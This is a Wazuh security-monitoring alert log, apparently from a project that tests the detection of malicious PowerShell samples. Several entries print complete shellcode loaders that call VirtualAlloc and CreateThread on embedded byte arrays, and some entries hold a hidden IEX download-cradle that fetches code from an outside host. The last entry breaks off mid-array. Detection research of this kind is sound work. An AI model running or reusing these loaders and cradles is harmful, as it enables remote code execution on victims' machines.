{"timestamp":"2026-07-06T02:21:56.452+0000","rule":{"level":10,"description":"Powershell script may be executing suspicious code with CreateThread API","id":"91810","mitre":{"id":["T1106"],"tactic":["Execution"],"technique":["Native API"]},"firedtimes":204,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304516.4166548","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:22:16.2910201Z","eventRecordID":"145871","processID":"2544","threadID":"4532","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\n$c = '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x86,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x8b,0x4c,0x10,0x78,0xe3,0x4a,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x89,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x69,0x6f,0x60,0xee,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};\r\n\r\nScriptBlock ID: 561aadf3-86db-4857-9e32-5878559afe89\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\454.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$c = '[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\\\"msvcrt.dll\\\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \\\"Win32\\\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x86,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x8b,0x4c,0x10,0x78,0xe3,0x4a,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x89,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x69,0x6f,0x60,0xee,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};","scriptBlockId":"561aadf3-86db-4857-9e32-5878559afe89","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\454.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-06T02:21:56.606+0000","rule":{"level":4,"description":"Powershell executed \"Get-Content -Stream or Invoke-Expresion\". Possible string execution as code","id":"91837","mitre":{"id":["T1059.001"],"tactic":["Execution"],"technique":["PowerShell"]},"firedtimes":27,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304516.4177433","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"5","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:22:17.0965514Z","eventRecordID":"145875","processID":"2476","threadID":"6944","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"VERBOSE","message":"\"Creating Scriptblock text (1 of 1):\r\npowershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://google-maps.redirectme.net:8080/'))\"\r\n\r\nScriptBlock ID: aebe369e-0ed5-4259-a0e5-7672c00b10fd\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\476.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"powershell.exe -nop -w hidden -c \\\"IEX ((new-object net.webclient).downloadstring('http://google-maps.redirectme.net:8080/'))\\\"","scriptBlockId":"aebe369e-0ed5-4259-a0e5-7672c00b10fd","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\476.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-06T02:21:57.520+0000","rule":{"level":4,"description":"Powershell executed \"Get-Content -Stream or Invoke-Expresion\". Possible string execution as code","id":"91837","mitre":{"id":["T1059.001"],"tactic":["Execution"],"technique":["PowerShell"]},"firedtimes":28,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304517.4179947","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"5","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:22:17.3548103Z","eventRecordID":"145879","processID":"1964","threadID":"3484","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"VERBOSE","message":"\"Creating Scriptblock text (1 of 1):\r\nIEX ((new-object net.webclient).downloadstring('http://google-maps.redirectme.net:8080/'))\r\n\r\nScriptBlock ID: 4050fbcd-c206-482a-af9c-c607a4a91216\r\nPath: \""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"IEX ((new-object net.webclient).downloadstring('http://google-maps.redirectme.net:8080/'))","scriptBlockId":"4050fbcd-c206-482a-af9c-c607a4a91216"}}},"location":"EventChannel"}
{"timestamp":"2026-07-06T02:21:57.713+0000","rule":{"level":10,"description":"Powershell script may be executing suspicious code with CreateThread API","id":"91810","mitre":{"id":["T1106"],"tactic":["Execution"],"technique":["Native API"]},"firedtimes":205,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304517.4182022","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:22:17.9614835Z","eventRecordID":"145888","processID":"8328","threadID":"6276","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\n$c = '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xda,0xc6,0xd9,0x74,0x24,0xf4,0xba,0x1b,0x1f,0xaa,0xa5,0x5b,0x31,0xc9,0xb1,0x59,0x31,0x53,0x18,0x03,0x53,0x18,0x83,0xc3,0x1f,0xfd,0x5f,0x7f,0xcc,0xd8,0xd4,0xa4,0x06,0x61,0x90,0xaf,0xa9,0x7b,0xc1,0x9e,0xfc,0x35,0xa0,0xd1,0xa6,0x2c,0xc6,0xfa,0xaa,0x4c,0x90,0xef,0x34,0xac,0xd0,0x06,0xd1,0x5d,0x60,0x15,0x8d,0xb4,0x7b,0xb9,0x77,0x8b,0x4e,0x1a,0x74,0xe3,0xaa,0x92,0x9c,0x70,0xae,0x1b,0xeb,0xf0,0xd3,0xf8,0x6e,0x8c,0xd6,0x26,0x19,0xed,0x1b,0x96,0x29,0x99,0x10,0x3a,0xd6,0xbc,0x26,0x08,0xa1,0x0f,0xa0,0x82,0x7e,0x5b,0x37,0xfc,0xbd,0x63,0xea,0x46,0x38,0xee,0xf6,0x40,0x73,0xd7,0xd0,0x11,0x22,0xb7,0x4c,0xd2,0x18,0xfc,0x2e,0x1d,0x31,0xe2,0x2a,0x92,0xa1,0x06,0x98,0xcf,0xd6,0xba,0x66,0x2d,0xba,0x39,0x52,0x10,0xf2,0xfa,0x50,0xb5,0x74,0xdc,0x8e,0x1c,0x21,0xe9,0xd6,0x45,0x92,0x31,0xce,0x00,0x66,0x50,0x7f,0xe5,0x57,0x3d,0x05,0x7c,0x2a,0x1f,0x4b,0x71,0x7a,0x45,0xec,0x79,0x31,0xdf,0xcf,0xac,0x60,0x9f,0x32,0x2d,0xc3,0x21,0x86,0xc9,0x3c,0x5e,0xf0,0x1a,0xe0,0x2f,0x98,0x52,0x5a,0x98,0xf2,0x2f,0xb9,0xf9,0xea,0x63,0x5f,0x09,0x0e,0xed,0xd3,0xe8,0x1d,0xb9,0xb2,0x28,0x13,0x62,0x56,0x39,0x74,0xf8,0x8c,0x19,0x12,0x9f,0xf0,0x77,0x13,0xeb,0xc1,0x2b,0x48,0x14,0xf5,0x68,0x0d,0xe8,0xf8,0x67,0xd2,0xc4,0xd8,0x6b,0x95,0x13,0xeb,0xad,0x2d,0x37,0x6f,0x6e,0x9c,0xc0,0x5d,0x47,0x75,0x6e,0x45,0x6b,0x0c,0xf3,0xfb,0x81,0x1e,0x55,0x23,0x38,0xd4,0xc1,0x81,0xca,0x35,0xc3,0x8b,0xd9,0x48,0x4c,0x3d,0x78,0x00,0x2d,0x7d,0x36,0xc6,0x99,0x26,0x69,0x17,0xb0,0xce,0x7c,0x32,0xb6,0x92,0x27,0xba,0xea,0xd5,0x92,0xfe,0xe5,0xf7,0x65,0x9b,0x9a,0xa7,0xee,0xd3,0x9a,0x6d,0xc6,0x0e,0x5b,0x11,0x36,0x72,0x4d,0x98,0x11,0xdf,0xda,0xa2,0x64,0x60,0x2e,0x62,0x98,0x32,0x11,0xa3,0x9b,0xfd,0x18,0xbf,0x64,0xa9,0xf2,0xd4,0x27,0xb3,0xd5,0x8c,0xb0,0x70,0xf5,0x7e,0x12,0x25,0x52,0x4b,0x19,0x63,0x18,0xb7,0xbc,0x00,0x8d,0x52,0xef,0xd6,0x6e,0x19,0x6d,0x16,0x64,0xc6,0x91,0x35,0x7a,0xbe,0xf9,0x15,0x31,0xda,0xd9,0x93,0x29,0x1d,0xef,0x8e,0x95,0x8d,0x80,0xa5,0xb5;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};\r\n\r\nScriptBlock ID: c1d4717f-7ee8-4570-8c2d-b84b0a899810\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\481.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$c = '[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\\\"msvcrt.dll\\\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \\\"Win32\\\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xda,0xc6,0xd9,0x74,0x24,0xf4,0xba,0x1b,0x1f,0xaa,0xa5,0x5b,0x31,0xc9,0xb1,0x59,0x31,0x53,0x18,0x03,0x53,0x18,0x83,0xc3,0x1f,0xfd,0x5f,0x7f,0xcc,0xd8,0xd4,0xa4,0x06,0x61,0x90,0xaf,0xa9,0x7b,0xc1,0x9e,0xfc,0x35,0xa0,0xd1,0xa6,0x2c,0xc6,0xfa,0xaa,0x4c,0x90,0xef,0x34,0xac,0xd0,0x06,0xd1,0x5d,0x60,0x15,0x8d,0xb4,0x7b,0xb9,0x77,0x8b,0x4e,0x1a,0x74,0xe3,0xaa,0x92,0x9c,0x70,0xae,0x1b,0xeb,0xf0,0xd3,0xf8,0x6e,0x8c,0xd6,0x26,0x19,0xed,0x1b,0x96,0x29,0x99,0x10,0x3a,0xd6,0xbc,0x26,0x08,0xa1,0x0f,0xa0,0x82,0x7e,0x5b,0x37,0xfc,0xbd,0x63,0xea,0x46,0x38,0xee,0xf6,0x40,0x73,0xd7,0xd0,0x11,0x22,0xb7,0x4c,0xd2,0x18,0xfc,0x2e,0x1d,0x31,0xe2,0x2a,0x92,0xa1,0x06,0x98,0xcf,0xd6,0xba,0x66,0x2d,0xba,0x39,0x52,0x10,0xf2,0xfa,0x50,0xb5,0x74,0xdc,0x8e,0x1c,0x21,0xe9,0xd6,0x45,0x92,0x31,0xce,0x00,0x66,0x50,0x7f,0xe5,0x57,0x3d,0x05,0x7c,0x2a,0x1f,0x4b,0x71,0x7a,0x45,0xec,0x79,0x31,0xdf,0xcf,0xac,0x60,0x9f,0x32,0x2d,0xc3,0x21,0x86,0xc9,0x3c,0x5e,0xf0,0x1a,0xe0,0x2f,0x98,0x52,0x5a,0x98,0xf2,0x2f,0xb9,0xf9,0xea,0x63,0x5f,0x09,0x0e,0xed,0xd3,0xe8,0x1d,0xb9,0xb2,0x28,0x13,0x62,0x56,0x39,0x74,0xf8,0x8c,0x19,0x12,0x9f,0xf0,0x77,0x13,0xeb,0xc1,0x2b,0x48,0x14,0xf5,0x68,0x0d,0xe8,0xf8,0x67,0xd2,0xc4,0xd8,0x6b,0x95,0x13,0xeb,0xad,0x2d,0x37,0x6f,0x6e,0x9c,0xc0,0x5d,0x47,0x75,0x6e,0x45,0x6b,0x0c,0xf3,0xfb,0x81,0x1e,0x55,0x23,0x38,0xd4,0xc1,0x81,0xca,0x35,0xc3,0x8b,0xd9,0x48,0x4c,0x3d,0x78,0x00,0x2d,0x7d,0x36,0xc6,0x99,0x26,0x69,0x17,0xb0,0xce,0x7c,0x32,0xb6,0x92,0x27,0xba,0xea,0xd5,0x92,0xfe,0xe5,0xf7,0x65,0x9b,0x9a,0xa7,0xee,0xd3,0x9a,0x6d,0xc6,0x0e,0x5b,0x11,0x36,0x72,0x4d,0x98,0x11,0xdf,0xda,0xa2,0x64,0x60,0x2e,0x62,0x98,0x32,0x11,0xa3,0x9b,0xfd,0x18,0xbf,0x64,0xa9,0xf2,0xd4,0x27,0xb3,0xd5,0x8c,0xb0,0x70,0xf5,0x7e,0x12,0x25,0x52,0x4b,0x19,0x63,0x18,0xb7,0xbc,0x00,0x8d,0x52,0xef,0xd6,0x6e,0x19,0x6d,0x16,0x64,0xc6,0x91,0x35,0x7a,0xbe,0xf9,0x15,0x31,0xda,0xd9,0x93,0x29,0x1d,0xef,0x8e,0x95,0x8d,0x80,0xa5,0xb5;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};","scriptBlockId":"c1d4717f-7ee8-4570-8c2d-b84b0a899810","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\481.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-06T02:21:58.950+0000","rule":{"level":10,"description":"Powershell script may be executing suspicious code with CreateThread API","id":"91810","mitre":{"id":["T1106"],"tactic":["Execution"],"technique":["Native API"]},"firedtimes":206,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304518.4194767","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:22:18.7770363Z","eventRecordID":"145892","processID":"4388","threadID":"708","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\n$6UhT = '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $6UhT -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xda,0xd6,0xbf,0xb6,0xed,0xe8,0xc5,0xd9,0x74,0x24,0xf4,0x5e,0x33,0xc9,0xb1,0x5a,0x31,0x7e,0x17,0x83,0xee,0xfc,0x03,0xc8,0xfe,0x0a,0x30,0xc8,0xe9,0x49,0xbb,0x30,0xea,0x2d,0x35,0xd5,0xdb,0x6d,0x21,0x9e,0x4c,0x5e,0x21,0xf2,0x60,0x15,0x67,0xe6,0xf3,0x5b,0xa0,0x09,0xb3,0xd6,0x96,0x24,0x44,0x4a,0xea,0x27,0xc6,0x91,0x3f,0x87,0xf7,0x59,0x32,0xc6,0x30,0x87,0xbf,0x9a,0xe9,0xc3,0x12,0x0a,0x9d,0x9e,0xae,0xa1,0xed,0x0f,0xb7,0x56,0xa5,0x2e,0x96,0xc9,0xbd,0x68,0x38,0xe8,0x12,0x01,0x71,0xf2,0x77,0x2c,0xcb,0x89,0x4c,0xda,0xca,0x5b,0x9d,0x23,0x60,0xa2,0x11,0xd6,0x78,0xe3,0x96,0x09,0x0f,0x1d,0xe5,0xb4,0x08,0xda,0x97,0x62,0x9c,0xf8,0x30,0xe0,0x06,0x24,0xc0,0x25,0xd0,0xaf,0xce,0x82,0x96,0xf7,0xd2,0x15,0x7a,0x8c,0xef,0x9e,0x7d,0x42,0x66,0xe4,0x59,0x46,0x22,0xbe,0xc0,0xdf,0x8e,0x11,0xfc,0x3f,0x71,0xcd,0x58,0x34,0x9c,0x1a,0xd1,0x17,0xc9,0xb2,0x8f,0xd3,0x09,0x23,0x27,0x72,0x64,0xda,0x93,0xec,0x34,0x6b,0x3a,0xeb,0x3b,0x46,0x73,0x28,0x90,0x3a,0x27,0x9d,0x44,0xd5,0xfd,0x77,0x12,0x82,0xfd,0xa2,0xb7,0x9f,0x6b,0x4f,0x6b,0x73,0x04,0xe7,0x9a,0x73,0xd4,0x1f,0x10,0x73,0xd4,0xdf,0x06,0x42,0xe2,0xe7,0x17,0xc3,0x0a,0x47,0xc0,0x44,0x82,0xf8,0xd6,0x94,0x41,0x8f,0x11,0x39,0x02,0x8f,0xaf,0x5e,0x56,0xdc,0x9c,0xcd,0x00,0xb1,0x74,0x9a,0x45,0x60,0x57,0x61,0x65,0x5f,0x31,0xff,0x93,0x00,0x56,0x80,0x97,0xbe,0xa6,0x09,0x37,0xd4,0xa2,0x59,0xd2,0x37,0xfd,0x31,0x57,0x01,0x9f,0x44,0x68,0x58,0xcc,0x1b,0xc4,0x31,0xa5,0xf3,0xc7,0xb3,0x51,0x7f,0xe7,0x6e,0xe4,0xbf,0x62,0x9a,0xa8,0x4a,0x54,0xf2,0xc6,0x00,0xc4,0x54,0xd8,0xbe,0x63,0x18,0x4e,0x41,0x64,0x98,0x8e,0x29,0x84,0x98,0xce,0xa9,0xd7,0xf0,0x96,0x0d,0x84,0xe5,0xd8,0x9b,0xb8,0xb6,0x75,0xad,0x58,0x6f,0x12,0xad,0x86,0x8f,0xe2,0xfe,0x90,0xe7,0xf0,0x96,0x94,0x15,0x0b,0x43,0x23,0x19,0x80,0xa1,0xa7,0x9e,0x68,0xf9,0x3d,0x60,0x1f,0x18,0x65,0xa3,0xbf,0x0a,0xe3,0xdc,0xbf,0x34,0x62,0x4b,0x2e,0xac,0x0e,0xee,0xc3,0x5c,0x98,0x9e,0x7c,0xd4,0x3f,0x33,0xad,0x7e,0xaf,0xbb,0xc5,0x11,0x01,0x54,0x54,0x89,0x5d;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$nGVk=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($nGVk.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$nGVk,0,0,0);for (;;){Start-sleep 60};\r\n\r\nScriptBlock ID: d43d0789-ae97-4274-ad61-ee91905a5424\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\52.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$6UhT = '[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\\\"msvcrt.dll\\\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $6UhT -Name \\\"Win32\\\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xda,0xd6,0xbf,0xb6,0xed,0xe8,0xc5,0xd9,0x74,0x24,0xf4,0x5e,0x33,0xc9,0xb1,0x5a,0x31,0x7e,0x17,0x83,0xee,0xfc,0x03,0xc8,0xfe,0x0a,0x30,0xc8,0xe9,0x49,0xbb,0x30,0xea,0x2d,0x35,0xd5,0xdb,0x6d,0x21,0x9e,0x4c,0x5e,0x21,0xf2,0x60,0x15,0x67,0xe6,0xf3,0x5b,0xa0,0x09,0xb3,0xd6,0x96,0x24,0x44,0x4a,0xea,0x27,0xc6,0x91,0x3f,0x87,0xf7,0x59,0x32,0xc6,0x30,0x87,0xbf,0x9a,0xe9,0xc3,0x12,0x0a,0x9d,0x9e,0xae,0xa1,0xed,0x0f,0xb7,0x56,0xa5,0x2e,0x96,0xc9,0xbd,0x68,0x38,0xe8,0x12,0x01,0x71,0xf2,0x77,0x2c,0xcb,0x89,0x4c,0xda,0xca,0x5b,0x9d,0x23,0x60,0xa2,0x11,0xd6,0x78,0xe3,0x96,0x09,0x0f,0x1d,0xe5,0xb4,0x08,0xda,0x97,0x62,0x9c,0xf8,0x30,0xe0,0x06,0x24,0xc0,0x25,0xd0,0xaf,0xce,0x82,0x96,0xf7,0xd2,0x15,0x7a,0x8c,0xef,0x9e,0x7d,0x42,0x66,0xe4,0x59,0x46,0x22,0xbe,0xc0,0xdf,0x8e,0x11,0xfc,0x3f,0x71,0xcd,0x58,0x34,0x9c,0x1a,0xd1,0x17,0xc9,0xb2,0x8f,0xd3,0x09,0x23,0x27,0x72,0x64,0xda,0x93,0xec,0x34,0x6b,0x3a,0xeb,0x3b,0x46,0x73,0x28,0x90,0x3a,0x27,0x9d,0x44,0xd5,0xfd,0x77,0x12,0x82,0xfd,0xa2,0xb7,0x9f,0x6b,0x4f,0x6b,0x73,0x04,0xe7,0x9a,0x73,0xd4,0x1f,0x10,0x73,0xd4,0xdf,0x06,0x42,0xe2,0xe7,0x17,0xc3,0x0a,0x47,0xc0,0x44,0x82,0xf8,0xd6,0x94,0x41,0x8f,0x11,0x39,0x02,0x8f,0xaf,0x5e,0x56,0xdc,0x9c,0xcd,0x00,0xb1,0x74,0x9a,0x45,0x60,0x57,0x61,0x65,0x5f,0x31,0xff,0x93,0x00,0x56,0x80,0x97,0xbe,0xa6,0x09,0x37,0xd4,0xa2,0x59,0